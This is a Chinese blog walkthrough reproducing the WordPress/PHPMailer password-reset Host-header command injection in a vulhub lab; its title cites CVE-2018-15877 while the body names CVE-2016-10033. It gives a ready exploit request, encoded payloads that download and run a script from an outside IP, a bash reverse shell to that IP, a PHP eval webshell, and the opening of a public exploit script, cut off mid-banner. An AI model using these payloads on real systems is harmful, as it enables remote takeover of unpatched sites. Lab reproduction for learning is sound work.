class="post-meta-categories" href="/categories/CVE%E6%BC%8F%E6%B4%9E/" itemprop="url">CVE漏洞</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/CVE/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>CVE</span></a></span></div></div><h1 class="post-title" itemprop="name headline">WordPress 远程命令执行漏洞复现(CVE-2018-15877)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2023-08-25T09:29:49.367Z" title="发表于 2023-08-25 17:29:49">2023-08-25</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2023-11-12T01:42:36.382Z" title="更新于 2023-11-12 09:42:36">2023-11-12</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">5.5k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>24分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="WordPress 远程命令执行漏洞复现(CVE-2018-15877)"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为太原"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>太原</span><span class="post-meta-separator"></span><span class="post-meta-commentcount"><i class="anzhiyufont anzhiyu-icon-comments post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2023/08/25/wordpress-yuan-cheng-ming-ling-zhi-xing-lou-dong-fu-xian-cve-2018-15877/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2023/08/25/wordpress-yuan-cheng-ming-ling-zhi-xing-lou-dong-fu-xian-cve-2018-15877/" itemprop="commentCount"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></a></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://hybcx.xyz/2023/08/25/wordpress-yuan-cheng-ming-ling-zhi-xing-lou-dong-fu-xian-cve-2018-15877/"><header><a class="post-meta-categories" href="/categories/CVE%E6%BC%8F%E6%B4%9E/" itemprop="url">CVE漏洞</a><a href="/tags/CVE/" tabindex="-1" itemprop="url">CVE</a><h1 id="CrawlerTitle" itemprop="name headline">WordPress 远程命令执行漏洞复现(CVE-2018-15877)</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">hybcx</span><time itemprop="dateCreated datePublished" datetime="2023-08-25T09:29:49.367Z" title="发表于 2023-08-25 17:29:49">2023-08-25</time><time itemprop="dateCreated datePublished" datetime="2023-11-12T01:42:36.382Z" title="更新于 2023-11-12 09:42:36">2023-11-12</time></header><h2 id="0x01-漏洞简述">0x01 漏洞简述</h2>
<blockquote>
<p>WordPress 是一种使用 PHP 语言开发的博客平台，用户可以在支持 PHP 和 MySQL 数据库的服务器上架设属于自己的网站。也可以把 WordPress 当作一个内容管理系统（CMS）来使用。WordPress 使用 PHPMailer 组件向用户发送邮件。PHPMailer (版本 &lt; 5.2.18) 存在远程命令执行漏洞，攻击者只需巧妙地构造出一个恶意邮箱地址，即可写入任意文件，造成远程命令执行的危害。</p>
</blockquote>
<ul>
<li>漏洞编号： CVE-2016-10033</li>
<li>影响版本： WordPress &lt;= 4.7.1 PHPMailer &lt; 5.2.18</li>
</ul>
<h3 id="漏洞触发条件">漏洞触发条件：</h3>
<ul>
<li>PHP 没有开启 <code>safe_mode</code>（默认）</li>
<li>攻击者需要知道 Web 服务部署的路径</li>
</ul>
<p>成功利用该漏洞后，攻击者可以远程任意代码执行。</p>
<h2 id="0x02-漏洞搭建">0x02 漏洞搭建</h2>
<p>这里我采用vulhub靶场搭建</p>
<p>进入到/vulhub/wordpress/pwnscriptum/目录后，我们执行命令：</p>
<pre><code class="hljs bash">docker-compose up -d</code></pre>
<p>访问对应端口即可，记得安全组放行。进去之后按要求配置信息即可，随后在转到忘记密码页面</p>
<h2 id="0x03-漏洞原理">0x03 漏洞原理</h2>
<p>![image-20230829150129261](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230829150129261.png)</p>
<p>此处是管理员重置密码页面，wordpress使用phpmailer组件进行重置密码邮件的发送，但是<code>phpmailer &lt; 5.2.18</code>之前的版本存在命令注入漏洞，具体你可以先阅读分析文章<a target="_blank" rel="noopener" href="https://paper.seebug.org/161/">链接</a> 。</p>
<p>我们来看看这个漏洞在wordpress中的情况。漏洞文件是<code>class.phpmailer.php</code>，我们在wordpress中搜索查看这个文件，该文件在在<code>wp-includes</code>目录下。我们可以发现几行关键代码：</p>
<pre><code class="hljs php"><span class="hljs-comment">/**</span>
<span class="hljs-comment">     * Which method to use to send mail.</span>
<span class="hljs-comment">     * Options: "mail", "sendmail", or "smtp".</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@var</span> string</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Mailer</span> = <span class="hljs-string">'mail'</span>;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * The path to the sendmail program.</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@var</span> string</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Sendmail</span> = <span class="hljs-string">'/usr/sbin/sendmail'</span>;</code></pre>
<p>我们发现，实际上phpmailer组件是调用linux系统命令<code>sendmail</code>进行邮件发送，命令格式为：<code>sendmail -t -i -fusername@hostname</code>。并且我们继续审计代码发现：</p>
<pre><code class="hljs php"><span class="hljs-comment">/**</span>
<span class="hljs-comment">     * Get the server hostname.</span>
<span class="hljs-comment">     * Returns 'localhost.localdomain' if unknown.</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@access</span> protected</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@return</span> string</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">serverHostname</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-variable">$result</span> = <span class="hljs-string">'localhost.localdomain'</span>;
        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable language_">$this</span>-&gt;Hostname)) {
            <span class="hljs-variable">$result</span> = <span class="hljs-variable language_">$this</span>-&gt;Hostname;
        } <span class="hljs-keyword">elseif</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>) <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">array_key_exists</span>(<span class="hljs-string">'SERVER_NAME'</span>, <span class="hljs-variable">$_SERVER</span>) <span class="hljs-keyword">and</span> !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'SERVER_NAME'</span>])) {
            <span class="hljs-variable">$result</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'SERVER_NAME'</span>];
        } <span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">'gethostname'</span>) &amp;&amp; <span class="hljs-title function_ invoke__">gethostname</span>() !== <span class="hljs-literal">false</span>) {
            <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">gethostname</span>();
        } <span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">php_uname</span>(<span class="hljs-string">'n'</span>) !== <span class="hljs-literal">false</span>) {
            <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">php_uname</span>(<span class="hljs-string">'n'</span>);
        }
        <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;
    }</code></pre>
<p><code>serverHostname</code>函数通过传入的<code>SERVER_NAME</code>参数来获取主机名，该主机名即HTTP请求报文中的host值，但是<code>SERVER_NAME</code>参数并没有经过任何过滤，因此我们可以进行任意构造拼接，从而产生了系统命令注入漏洞。</p>
<p>更棒的是，<code>sendmail</code> 提供了<code>-O</code>和<code>-X</code>参数，<code>-X</code>参数用于写入日志文件， 我们可以使用<code>-OQueueDirectory=/tmp/ -X/tmp/smtp.php</code>命令组合，它会将发送的邮件保存到<code>/tmp/smtp.php</code>中， 那么在请求的时候payload应该类似于这样：</p>
<pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/wordpress/wp-login.php?action=lostpassword</span> <span class="hljs-meta">HTTP/1.1</span>
<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>aaa( -X/tmp/smtp.php )@qq.com</code></pre>
<p>在@前面，如果加上括号，将可以引入空格，这样就可以拼接到了sendmail命令中并且保存了测试邮件文件。那么如果我们写入的是Webshell后门文件呢？</p>
<p>思路很好，然而现实很无奈。</p>
<ul>
<li>wordpress方面以及PHPMailer库方面都会防止攻击者注入空字符（空格或TAB）到sendmail命令中。并且，添加括号引入向sendmail中注入参数的方法已经行不通了，具体可以参考<a target="_blank" rel="noopener" href="http://www.securityspace.com/s_survey/data/man.201703/mxsurvey.html">链接</a>。</li>
<li>比如我们想要调用<code>/bin/touch</code>的时候也会出问题，因为host字段中如果出现<code>/</code>，服务器会拒绝我们的请求。</li>
</ul>
<p>因此上述的Sendmail技术在这种情况下不起作用，这条路走不通了！</p>
<p>正感觉走投无路的时候，这时候我们不妨喝杯茶冷静一下，为什么sendmail能够产生命令注入漏洞呢？我们去了解一下sendmail。然后就会发现柳暗花明又一村了。我们可以知道<code>ubuntu/debain</code>系统中，已经使用exim4替代了sendmail的功能，我们查看sendmail文件可以发现它是一个链向exim4的软链接文件。</p>
<p>![image-20230829151151126](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230829151151126.png)</p>
<p>那么我们可以利用exim4的语法参数进行命令执行参数的拼接啊！我们查看exim4的帮助手册，可以发现<code>-be</code>参数</p>
<pre><code class="hljs plaintext">Run Exim in expansion testing mode. Exim  discards  its  root
                 privilege,  to prevent ordinary users from using this mode to
                 read otherwise inaccessible files. If no arguments are given,
                 Exim  runs interactively, prompting for lines of data. Other‐
                 wise, it processes each argument in turn.

                 If Exim was built with USE_READLINE=yes in Local/Makefile, it
                 tries  to  load  the libreadline library dynamically whenever
                 the -be option is used without  command  line  arguments.  If
                 successful,  it  uses the readline() function, which provides
                 extensive line-editing facilities, for reading the test data.
                 A line history is supported.

                 Long expansion expressions can be split over several lines by
                 using backslash continuations. As in Exim's run time configu‐
                 ration,  white  space  at  the start of continuation lines is
                 ignored. Each argument or data line  is  passed  through  the
                 string  expansion  mechanism, and the result is output. Vari‐
                 able values from the configuration file (for example,  $qual‐
                 ify_domain)  are  available,  but  no message-specific values
                 (such as $message_exim_id) are set,  because  no  message  is
                 being processed (but see -bem and -Mset).

                 Note:  If  you  use  this  mechanism to test lookups, and you
                 change the data files or databases you are  using,  you  must
                 exit  and  restart  Exim before trying the same lookup again.
                 Otherwise, because each Exim process caches  the  results  of
                 lookups,  you will just get the same result as before.  Macro
                 processing is done  on  lines  before  string-expansion:  new
                 macros  can  be defined and macros will be expanded.  Because
                 macros in the config file are often used for  secrets,  those
                 are only available to admin users.</code></pre>
<p><strong>下面同样也是<code>${substr{10}{1}{$tod_log}}</code>与<code>${substr{0}{1}{$spool_directory}}</code>的原理：</strong></p>
<p>我们可以知道<code>ubuntu/debain</code>系统中，已经使用exim4替代了sendmail的功能，我们查看sendmail文件可以发现它是一个链向exim4的软链接文件。</p>
<p>![image-20230825175812446](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230825175812446.png)</p>
<p>那么我们可以利用exim4的语法参数进行命令执行参数的拼接啊！我们查看exim4的帮助手册，可以发现<code>-be</code>参数，简单来说，<code>-be</code>参数是一个字符串拓展测试命令，它可以读取一些变量的数据。比如，<code>$tod_log</code>，它可以显示系统时间。</p>
<p>并且，exim4提供了一些函数用来执行一些命令，如字符串截取函数<code>substr</code>、<code>$run</code>系统调用函数。</p>
<p>我们可以截取空格字符。如图所示，substr函数从第十个字符开始截取，共截取一个字符，也就是时间字符串的第11个字符，是空格字符。</p>
<p>![image-20230825175901430](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230825175901430.png)</p>
<p>那么同理，我们也可以截取<code>/</code>字符串：</p>
<p>![image-20230825175909679](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230825175909679.png)</p>
<p>我们测试使用<code>$run</code>函数调用系统命令</p>
<p>![image-20230825175924125](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230825175924125.png)</p>
<p>到这里，遇到的问题都解决了。</p>
<h2 id="0x04-漏洞复现">0x04 漏洞复现</h2>
<h3 id="exp">EXP</h3>
<pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/wp-login.php?action=lostpassword</span> <span class="hljs-meta">HTTP/1.1</span>
<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>target(any -froot@localhost -be ${run{【要执行的命令】}} null)
<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close
<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
<span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*
<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>56
<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded

<span class="language-pgsql">wp-submit=<span class="hljs-keyword">Get</span>+<span class="hljs-built_in">New</span>+<span class="hljs-keyword">Password</span>&amp;redirect_to=&amp;user_login=<span class="hljs-keyword">admin</span></span></code></pre>
<p>我们在数据包中将要执行的命令，插入到上述payload中指定的位置，就可以实现命令执行了。但是，这个漏洞的利用存在很大的限制，主要限制如下所示：</p>
<pre><code class="hljs plaintext">1.执行的命令不能包含大量特殊字符，如:、引号等。
2.命令会被转换成小写字母
3.命令需要使用绝对路径
4.需要知道某一个存在的用户的用户名
5.我们处理后的命令会执行，但是不会显示到页面上。
为了解决这些坑，漏洞作者想出了，利用 ${substr{0}{1}{$spool_directory}} 代替 / ，用 ${substr{10}{1}{$tod_log}} 代替空格的方法。

但是还是有很多字符不能用，所以我们需要将待执行的命令放到第三方网站中，然后通过 curl -o /tmp/rce example.com/shell.sh 的方法先将他下载到 /tmp 目录中，再去执行。</code></pre>
<h3 id="利用">利用</h3>
<p>所以，总体来说利用过程如下：</p>
<ul>
<li>编写反弹 shell 的 exp，放到某个网页里。有如下要求：
<ul>
<li>整个 url 的大写字母会被转换成小写，所以大写小敏感的系统不要使用大写字母做文件路径</li>
<li>访问该网页不能跳转，因为 follow 跳转的参数是 <code>-L</code> （大写）</li>
</ul>
</li>
<li>拼接成命令 <code>/usr/bin/curl -o/tmp/rce example.com/shell.sh</code> 和命令 <code>/bin/bash /tmp/rce</code></li>
<li>将上述命令中的空格和 / 转换成 <code>${substr{10}{1}{$tod_log}}</code> 和 <code>${substr{0}{1}{$spool_directory}}</code></li>
<li>拼接成 HTTP 包的 Host 头： <code>target(any -froot@localhost -be ${run{command}} null)</code></li>
<li>依次发送这两个拼接好的数据包</li>
</ul>
<h3 id="复现">复现</h3>
<p>漏洞缺陷处在后台找回密码的地方<br>
初始化管理员用户名和密码后访问 <code>https://ip:8080/wp-login.php</code>，点击忘记密码界面</p>
<p>![image-20230825180517679](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230825180517679.png)<br>
这里用户名为 @1_h bcx</p>
<p>我们于是可以构造payload如下，该payload在/tmp/目录下创建test.txt文件：</p>
<pre><code class="hljs plaintext">aa(any -froot@localhost -be ${run{/bin/touch /tmp/test.txt}} null)</code></pre>
<blockquote>
<p>空格  ==&gt; ${substr{10}{1}{$tod_log}}</p>
<p>/  ==&gt; ${substr{0}{1}{$spool_directory}}</p>
</blockquote>
<p>转换过来就是</p>
<pre><code class="hljs plaintext">aa(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}touch${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}test.txt}} null)</code></pre>
<p>![image-20230825191914211](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230825191914211.png)</p>
<p>在/tmp目录下发现成功生成了测试文件。</p>
<p>![image-20230825191840698](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230825191840698.png)</p>
<h4 id="反弹-shell">反弹 shell</h4>
<p>利用 <code>curl</code> 或者 <code>wget</code> 命令下载远程文件</p>
<blockquote>
<p>测试下载反弹 shell：<br>
注意：</p>
<ul>
<li>攻击机启用 http 服务</li>
<li>远程 URL 中不能有 <code>http://</code></li>
<li>所有字母必须小写</li>
</ul>
</blockquote>
<p>远程反弹shell脚本：<code>ip/a.txt</code>，内容：</p>
<pre><code class="hljs plaintext">bash -i &gt;&amp; /dev/tcp/124.220.233.26/12345 0&gt;&amp;1</code></pre>
<p>payload：</p>
<pre><code class="hljs plaintext">/usr/bin/wget --output-document /tmp/rce 124.220.233.26/a.txt</code></pre>
<p>执行反弹shell：</p>
<pre><code class="hljs plaintext">/bin/bash /tmp/rce</code></pre>
<p>两个payload转换过来就是</p>
<pre><code class="hljs plaintext">aa(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}wget${substr{10}{1}{$tod_log}}--output-document${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}rce${substr{10}{1}{$tod_log}}124.220.233.26${substr{0}{1}{$spool_directory}}a.txt}} null)

aa(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}bash${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}rce}} null)</code></pre>
<p>在反弹主机上用nc监听1337端口，分别按顺序提交payload即可获取到反弹shell</p>
<pre><code class="hljs plaintext">nc -lvnp 12345</code></pre>
<p>![image-20230829162742888](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230829162742888.png)</p>
<h4 id="写入一句话webshell">写入一句话webshell</h4>
<p>1.txt内容：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span></code></pre>
<p>同理，可以直接下载一句话webshell，然后菜刀连接。payload：</p>
<p>payload：</p>
<pre><code class="hljs plaintext">aa(any -froot@localhost -be ${run{/usr/bin/wget --output-document /var/www/html/1.php 124.220.233.26/1.txt}} null)</code></pre>
<p>转换过来即</p>
<pre><code class="hljs plaintext">aa(any -froot@localhost -be ${run{aa(any${substr{10}{1}{$tod_log}}-froot@localhost${substr{10}{1}{$tod_log}}-be${substr{10}{1}{$tod_log}}${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}wget${substr{10}{1}{$tod_log}}--output-document${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}var${substr{0}{1}{$spool_directory}}www${substr{0}{1}{$spool_directory}}html${substr{0}{1}{$spool_directory}}1.php${substr{10}{1}{$tod_log}}ip${substr{0}{1}{$spool_directory}}1.txt}}${substr{10}{1}{$tod_log}}null)}} null)</code></pre>
<p>![image-20230825203125950](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230825203125950.png)</p>
<h2 id="0x05-poc">0x05 POC</h2>
<p>自动化提交 payload，获取反弹 shell。通过 <code>python -mSimpleHTTPServer</code> 80 建立 web 服务，用于目标下载 shell。运行是需要用管理员权限，因为监听了 80 端口。</p>
<p>使用方法<br>
攻击机上运行./exp.sh [<a target="_blank" rel="noopener" href="https://www.77169.net/go?url=http://xx.xx.xx.xx/">http://xx.xx.xx.xx/</a>](<a target="_blank" rel="noopener" href="https://www.77169.net/go?url=http://xx.xx.xx.xx/">http://xx.xx.xx.xx/</a>)即可 其中xx.xx.xx.xx为靶机wordpress的根地址</p>
<pre><code class="hljs sh"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment">#      __                     __   __  __           __</span>
<span class="hljs-comment">#     / /   ___  ____ _____ _/ /  / / / /___ ______/ /_____  __________</span>
<span class="hljs-comment">#    / /   / _ \/ __ `/ __ `/ /  / /_/ / __ `/ ___/ //_/ _ \/ ___/ ___/</span>
<span class="hljs-comment">#   / /___/  __/ /_/ / /_/ / /  / __  / /_/ / /__/ ,&lt; /  __/ /  (__  )</span>
<span class="hljs-comment">#  /_____/\___/\__, /\__,_/_/  /_/ /_/\__,_/\___/_/|_|\___/_/  /____/</span>
<span class="hljs-comment">#            /____/</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment"># WordPress 4.6 - Remote Code Execution (RCE) PoC Exploit</span>
<span class="hljs-comment"># CVE-2016-10033</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment"># wordpress-rce-exploit.sh (ver. 1.0)</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment"># Discovered and coded by</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment"># Dawid Golunski (@dawid_golunski)</span>
<span class="hljs-comment"># https://legalhackers.com</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment"># ExploitBox project:</span>
<span class="hljs-comment"># https://ExploitBox.io</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment"># Full advisory URL:</span>
<span class="hljs-comment"># https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment"># Exploit src URL:</span>
<span class="hljs-comment"># https://exploitbox.io/exploit/wordpress-rce-exploit.sh</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment"># Tested on WordPress 4.6:</span>
<span class="hljs-comment"># https://github.com/WordPress/WordPress/archive/4.6.zip</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment"># Usage:</span>
<span class="hljs-comment"># ./wordpress-rce-exploit.sh target-wordpress-url</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment"># Disclaimer:</span>
<span class="hljs-comment"># For testing purposes only</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment"># -----------------------------------------------------------------</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment"># Interested in vulns/exploitation?</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment">#                        .;lc'</span>
<span class="hljs-comment">#                    .,cdkkOOOko;.</span>
<span class="hljs-comment">#                 .,lxxkkkkOOOO000Ol'</span>
<span class="hljs-comment">#             .':oxxxxxkkkkOOOO0000KK0x:'</span>
<span class="hljs-comment">#          .;ldxxxxxxxxkxl,.'lk0000KKKXXXKd;.</span>
<span class="hljs-comment">#       ':oxxxxxxxxxxo;.       .:oOKKKXXXNNNNOl.</span>
<span class="hljs-comment">#      '';ldxxxxxdc,.              ,oOXXXNNNXd;,.</span>
<span class="hljs-comment">#     .ddc;,,:c;.         ,c:         .cxxc:;:ox:</span>
<span class="hljs-comment">#     .dxxxxo,     .,   ,kMMM0:.  .,     .lxxxxx:</span>
<span class="hljs-comment">#     .dxxxxxc     lW. oMMMMMMMK  d0     .xxxxxx:</span>
<span class="hljs-comment">#     .dxxxxxc     .0k.,KWMMMWNo :X:     .xxxxxx:</span>
<span class="hljs-comment">#     .dxxxxxc      .xN0xxxxxxxkXK,      .xxxxxx:</span>
<span class="hljs-comment">#     .dxxxxxc    lddOMMMMWd0MMMMKddd.   .xxxxxx:</span>
<span class="hljs-comment">#     .dxxxxxc      .cNMMMN.oMMMMx'      .xxxxxx:</span>
<span class="hljs-comment">#     .dxxxxxc     lKo;dNMN.oMM0;:Ok.    'xxxxxx:</span>
<span class="hljs-comment">#     .dxxxxxc    ;Mc   .lx.:o,    Kl    'xxxxxx:</span>
<span class="hljs-comment">#     .dxxxxxdl;. .,               .. .;cdxxxxxx:</span>
<span class="hljs-comment">#     .dxxxxxxxxxdc,.              'cdkkxxxxxxxx:</span>
<span class="hljs-comment">#      .':oxxxxxxxxxdl;.       .;lxkkkkkxxxxdc,.</span>
<span class="hljs-comment">#          .;ldxxxxxxxxxdc, .cxkkkkkkkkkxd:.</span>
<span class="hljs-comment">#             .':oxxxxxxxxx.ckkkkkkkkxl,.</span>
<span class="hljs-comment">#                 .,cdxxxxx.ckkkkkxc.</span>
<span class="hljs-comment">#                    .':odx.ckxl,.</span>
<span class="hljs-comment">#                        .,.'.</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment"># https://ExploitBox.io</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment"># https://twitter.com/Exploit_Box</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment"># -----------------------------------------------------------------</span>
 
rev_host=<span class="hljs-string">"124.220.233.26"</span>
 
<span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">prep_host_header</span></span>() {
      cmd=<span class="hljs-string">"<span class="hljs-variable">$1</span>"</span>
      rce_cmd=<span class="hljs-string">"\${run{<span class="hljs-variable">$cmd</span>}}"</span>;
 
      <span class="hljs-comment"># replace / with ${substr{0}{1}{$spool_directory}}</span>
      <span class="hljs-comment">#sed 's^/^${substr{0}{1}{$spool_directory}}^g'</span>
      rce_cmd=<span class="hljs-string">"`echo <span class="hljs-variable">$rce_cmd</span> | sed 's^/^\${substr{0}{1}{\$spool_directory}}^g'`"</span>
 
      <span class="hljs-comment"># replace ' ' (space) with</span>
      <span class="hljs-comment">#sed 's^ ^${substr{10}{1}{$tod_log}}$^g'</span>
      rce_cmd=<span class="hljs-string">"`echo <span class="hljs-variable">$rce_cmd</span> | sed 's^ ^\${substr{10}{1}{\$tod_log}}^g'`"</span>
      <span class="hljs-comment">#return "target(any -froot@localhost -be $rce_cmd null)"</span>
      host_header=<span class="hljs-string">"target(any -froot@localhost -be <span class="hljs-variable">$rce_cmd</span> null)"</span>
      <span class="hljs-built_in">return</span> 0
}
 
<span class="hljs-comment">#cat exploitbox.ans</span>
intro=<span class="hljs-string">"</span>
<span class="hljs-string">DQobWzBtIBtbMjFDG1sxOzM0bSAgICAuO2xjJw0KG1swbSAbWzIxQxtbMTszNG0uLGNka2tPT09r</span>
<span class="hljs-string">bzsuDQobWzBtICAgX19fX19fXxtbOEMbWzE7MzRtLiwgG1swbV9fX19fX19fG1s1Q19fX19fX19f</span>
<span class="hljs-string">G1s2Q19fX19fX18NCiAgIFwgIF9fXy9fIF9fX18gG1sxOzM0bScbWzBtX19fXBtbNkMvX19fX19c</span>
<span class="hljs-string">G1s2Q19fX19fX19cXyAgIF8vXw0KICAgLyAgXy8gICBcXCAgIFwvICAgLyAgIF9fLxtbNUMvLyAg</span>
<span class="hljs-string">IHwgIFxfX19fXy8vG1s3Q1wNCiAgL19fX19fX19fXz4+G1s2QzwgX18vICAvICAgIC8tXCBfX19f</span>
<span class="hljs-string">IC8bWzVDXCBfX19fX19fLw0KIBtbMTFDPF9fXy9cX19fPiAgICAvX19fX19fX18vICAgIC9fX19f</span>
<span class="hljs-string">X19fPg0KIBtbNkMbWzE7MzRtLmRkYzssLDpjOy4bWzlDG1swbSxjOhtbOUMbWzM0bS5jeHhjOjs6</span>
<span class="hljs-string">b3g6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eG8sG1s1QxtbMG0uLCAgICxrTU1NMDouICAuLBtb</span>
<span class="hljs-string">NUMbWzM0bS5seHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s1QxtbMG1sVy4gb01N</span>
<span class="hljs-string">TU1NTU1LICBkMBtbNUMbWzM0bS54eHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s1</span>
<span class="hljs-string">QxtbMG0uMGsuLEtXTU1NV05vIDpYOhtbNUMbWzM0bS54eHh4eHg6DQobWzM3bSAbWzZDLhtbMTsz</span>
<span class="hljs-string">NG1keHh4eHhjG1s2QxtbMG0ueE4weHh4eHh4eGtYSywbWzZDG1szNG0ueHh4eHh4Og0KG1szN20g</span>
